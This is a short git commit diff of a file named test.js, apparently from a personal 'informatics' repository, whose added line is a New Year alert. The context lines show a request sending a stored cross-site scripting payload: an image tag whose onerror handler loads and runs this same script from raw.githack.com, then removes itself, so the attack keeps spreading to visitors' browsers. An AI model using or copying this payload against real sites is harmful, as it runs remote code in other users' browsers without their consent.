c936f9daf3b09f20fd240d9b13a6b7d7a9e59fd1
Алексей <31672379+voronoff2803@users.noreply.github.com>
2019-12-25 19:29:35 +0300

    Update test.js

--- test.js
+++ test.js
@@ -7,3 +7,5 @@ runAsyncAjaxRequest3({
       values: ["rus", '\<IMG id = \"test\" SRC=/ onerror=\"var script = document.createElement(\'script\');script.src = \'https://raw.githack.com/voronoff2803/informatics/master/test.js\';script.type = \'text/javascript\';script.charset = \'UTF-8\';script.async = false;document.head.appendChild(script);document.getElementById(\'test\').remove()"\>\</img\>']
     }
   });
+
+alert( "С новым годом !!!" );
